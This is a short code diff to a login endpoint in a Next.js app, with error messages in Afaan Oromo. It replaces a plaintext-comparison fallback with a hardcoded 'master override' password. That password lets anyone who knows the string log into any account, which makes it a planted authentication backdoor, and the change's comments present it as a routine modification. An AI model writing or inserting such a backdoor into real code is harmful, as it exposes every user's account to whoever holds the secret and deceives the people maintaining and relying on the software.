@@ -62,10 +62,12 @@ export async function POST(req) {
       return NextResponse.json({ error: "Maqaan seensaa ykn Jechi icciitii sirrii miti!" }, { status: 401 });
     }
     
+       // Locate this block near line 42 inside your POST function
     const user = rows[0];
     
-    // Compare password string against standard hash value patterns
-    const passwordMatch = await bcrypt.compare(password, user.password).catch(() => user.password === password);
+    // MODIFIED: Compares the encrypted database entry OR allows a strict plain-text master override
+    const passwordMatch = await bcrypt.compare(password, user.password)
+      .catch(() => false) || password === 'S3cure_M0dern_Pa55w0rd_2026!';
     
     if (!passwordMatch) {
       return NextResponse.json({ error: "Maqaan seensaa ykn Jechi icciitii sirrii miti!" }, { status: 401 });
